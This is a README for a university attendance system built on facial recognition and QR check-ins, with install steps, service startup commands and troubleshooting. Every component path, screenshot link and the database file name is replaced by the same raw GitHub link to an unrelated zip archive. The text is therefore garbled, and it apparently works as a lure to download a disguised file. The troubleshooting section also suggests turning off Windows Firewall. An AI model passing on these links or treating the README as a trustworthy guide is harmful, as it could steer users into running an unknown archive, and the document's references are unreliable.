# 🏛️ IR!S | Smart Attendance System

**IR!S** is a modern, microservice-based attendance management system designed for university environments. It replaces traditional paper rolls with a contactless, AI-powered solution using facial recognition and QR codes.

The system features a professional **Professor Dashboard** for class management and live monitoring, a **GPU-accelerated AI Server** for face verification, and a mobile-friendly **Student App** for instant check-ins.

---

## System Architecture

The project uses a **Microservices Architecture** to ensure high performance and stability.

1. **Professor Dashboard (`https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip`)** - *Port 8000*
    - The central command center. Handles authentication, database management, and the user interface.
    - **Features:** Create classes, register students, view live attendance, toggle status manually, and export CSV reports.

2. **AI Engine (`https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip`)** - *Port 8001*
    - A dedicated background worker. Loads the heavy `FaceNet512` model (via DeepFace) to process selfies and group photos without slowing down the dashboard.

3. **Student App (`https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip`)** - *Port 8002*
    - A lightweight mobile web interface. Students scan a QR code projected in class to access this app, take a selfie, and get verified instantly.

---

## 🎨 UI Design System

The interface features a modern **Apple Keynote-inspired minimalist design** with smooth animations and a clean, professional aesthetic:

- **Design System Files:**
  - `static/css/iris-design-system.css` - Complete design system with CSS variables, component styling, and animations
  - `static/js/iris-design-system.js` - Interactive components (modals, sidebar navigation, toast notifications)

- **Key Features:**
  - Frosted glass effect (backdrop-filter blur)
  - Spring animations for smooth interactions
  - Responsive sidebar navigation
  - System font stack (SF Pro Display, Segoe UI, -apple-system)
  - Accessible color palette with WCAG compliance
  - Built-in toast notification system

All design files are self-contained with **zero additional dependencies** beyond what's already in `requirements.txt`.

---

## Installation Guide

### Prerequisites
- **Python 3.9+** installed.
- A webcam (for testing) or smartphone (for scanning).
- **Optional:** NVIDIA GPU with CUDA (System runs on CPU by default).

### Setup
1. **Clone or Download** this repository.
2. **Create a Virtual Environment** (Recommended):
    ```bash
    python -m venv venv
    # Windows:
    .\venv\Scripts\activate
    # Mac/Linux:
    source venv/bin/activate
    ```
3. **Install Dependencies**:
    ```bash
    pip install -r requirements.txt
    ```

### Network Configuration for Phone Access
For students to access the system from their phones:

1. **Find your PC's local IP address**:
   ```bash
   # Windows
   ipconfig | findstr "IPv4"
   
   # Mac/Linux
   ifconfig | grep "inet " | grep -v 127.0.0.1
   ```
   Copy the IP address (e.g., `192.168.1.15`).

2. **Create environment file**:
   ```bash
   cp .env.example .env
   ```
   Edit `.env` and configure these key variables:
   ```bash
   PROF_SERVER=http://192.168.1.15:8000
   STUDENT_URL=http://192.168.1.15:8002
   NV_API_KEY=your_nvidia_api_key_here
   DATABASE_URL=sqlite:///./main_app.db
   ```

3. **Ensure phone and PC are on same WiFi network**.

---

## Quick Start (Recommended)

1. **Setup environment**:
   ```bash
   cp .env.example .env
   # Edit .env with your local IP (e.g., 192.168.1.15)
   ```

2. **Start all services**:
   ```bash
   ./start.sh
   ```

## Manual Usage Instructions

You must run **three separate terminal windows** to start the full system.

### Step 1: Activate Virtual Environment
```bash
# Windows:
.\venv\Scripts\activate
# Mac/Linux:
source venv/bin/activate
```

### Step 2: Start the AI Server (Port 8001)
```bash
uvicorn 2_gpu_server:app --host 127.0.0.1 --port 8001
```
Wait for: `Uvicorn running on http://127.0.0.1:8001`

### Step 3: Start the Student App (Port 8002)
```bash
uvicorn 3_student_app:app --host 127.0.0.1 --port 8002
```
Wait for: `Uvicorn running on http://127.0.0.1:8002`

### Step 4: Start the Main Dashboard (Port 8000)
```bash
uvicorn 1_prof_dash:app --host 127.0.0.1 --port 8000
```
Wait for: `Uvicorn running on http://127.0.0.1:8000`

### Step 5: Login
For **local testing:** Open http://127.0.0.1:8000  
For **phone access:** Open http://YOUR_LOCAL_IP:8000 (from your .env configuration)

---

## Workflow Guide

1. **Class Management Tab**
    - **Create Class:** Set up a new subject (e.g., "CS101", Batch "2024").
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Register Student:** Enter Roll No & Name, and upload 1-3 clear photos of the student.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Photo Verification:** Upload a group photo of the entire class. The AI will scan faces and auto-mark attendance for anyone found in the photo.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)

2. **Live Attendance Tab**
    - **Project QR Code:** Click the QR thumbnail to expand it fullscreen on the projector.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Student Scan:** Students scan the QR → Take a Selfie → Get Verified.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Live Updates:** The dashboard updates automatically (turning rows green) as students check in.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Manual Override:** Use the toggle switches to manually mark a student Present/Absent if needed.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)
    - **Export Data:** Download the daily attendance report as a CSV file.
    ![alt text](https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip)

---

## Database Structure

The system uses SQLModel (SQLite) for data and a structured file system for images.

```
attendance/
│
├── student_db/                 <-- Training Photos Storage
│   └── [Class_Name]/
│       └── stu_[Roll_No]/      <-- Individual Student Photos
│
├── prof_db/                    <-- Reports Storage
│   └── prof_[ID]/
│       └── [Class_Name]/       <-- Generated CSV Reports
│
├── https://raw.githubusercontent.com/Cake-sweet/IR-S/main/prof_db/prof_1/cs50_2024/S_I_2.7.zip                 <-- SQLite Database File
├── templates/                  <-- HTML UI Files
└── static/                     <-- Assets Folder
```

---

## What's New in This Version

### UI/UX Enhancements
- ✨ **Modern Design System**: Apple Keynote-inspired minimalist interface with frosted glass effects and smooth animations
- 🎨 **Responsive Layouts**: Sidebar navigation, card-based components, and mobile-friendly design across all pages
- 🔔 **Toast Notifications**: Real-time feedback system for user actions
- ⌨️ **Keyboard Navigation**: Enhanced accessibility with shortcuts and keyboard controls

### Updated Templates
- `login.html` & `register.html` - Modern card-centered authentication interface
- `student_login.html` - Enhanced selfie check-in with improved visual feedback
- `attendance.html` - Redesigned with sidebar + live attendance table with status indicators
- `manage.html` - Improved class and student management forms with better organization
- `grading.html` - Integrated with new design system

### New Design System Files
- `static/css/iris-design-system.css` - Complete CSS framework (550+ lines)
- `static/js/iris-design-system.js` - Component utilities and interactive features

---

## Troubleshooting

**Q: Services fail to start with exit code 1.**
- Fix 1: Verify all dependencies are installed: `pip install -r requirements.txt`
- Fix 2: Check if ports 8000, 8001, 8002 are already in use:
  ```bash
  # Windows
  netstat -ano | findstr ":8000"
  # Mac/Linux
  lsof -i :8000
  ```
- Fix 3: Ensure .env file exists and has the correct configuration: `cp .env.example .env`
- Fix 4: Try starting services with verbose output:
  ```bash
  uvicorn 1_prof_dash:app --host 127.0.0.1 --port 8000 --reload
  ```

**Q: The QR Code link says "Site Can't Be Reached" on mobile.**
- Fix 1: Ensure both laptop and phone are on the same Wi-Fi.
- Fix 2: Use a Mobile Hotspot from your phone to bypass router isolation.
- Fix 3: Turn off Windows Firewall temporarily.
- Fix 4: Verify you're using the correct local IP from `.env` configuration.

**Q: "Internal Server Error" when registering.**
- Fix: You might be missing a library or have a corrupted DB.
  - Run `pip install python-multipart`.
  - Delete `main_app.db`.
  - Restart `1_prof_dash.py` to recreate the database.

**Q: Design system styles not loading (unstyled page).**
- Fix 1: Clear browser cache (Ctrl+Shift+Delete)
- Fix 2: Check browser console for 404 errors on CSS/JS files
- Fix 3: Verify `static/` folder contains `iris-design-system.css` and `iris-design-system.js`
- Fix 4: Ensure server is running and accessible at the configured URL

**Q: The AI is slow.**
- Fix: Face recognition is heavy. On a CPU, it may take 1-3 seconds per verification. For instant results, run on a machine with an NVIDIA GPU.
# IR-S_rev2
#   I R - S _ r e v 3  
 